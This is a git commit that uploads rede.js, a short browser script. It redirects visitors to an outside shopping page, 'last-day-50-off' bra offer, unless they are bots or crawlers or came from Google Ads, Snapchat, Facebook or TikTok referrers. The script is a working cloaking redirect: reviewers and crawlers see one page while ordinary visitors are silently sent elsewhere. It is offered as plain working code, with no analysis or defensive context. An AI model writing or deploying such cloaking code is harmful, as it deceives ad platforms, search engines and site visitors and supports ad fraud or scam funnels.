61cc39838041d822ca89f527fb525e8aa266d01e
jarrettheinz947 <132490000+jarrettheinz947@users.noreply.github.com>
2023-07-09 08:48:32 -0500

    Add files via upload

---
+++ rede.js
@@ -0,0 +1,8 @@
+<script>
+  var referrer = document.referrer.toLowerCase();
+  var userAgent = navigator.userAgent.toLowerCase();
+  var isBot = (userAgent.indexOf("bot") !== -1) || (userAgent.indexOf("crawl") !== -1);
+  if (!isBot && (referrer.indexOf("googleads") === -1) && (referrer.indexOf("snapchat") === -1) && (referrer.indexOf("facebook") === -1) && (referrer.indexOf("tiktok") === -1)) {
+    window.location.href = "https://carminomart.com/last-day-50-off-comfy-breathable-bra/";
+  }
+</script>
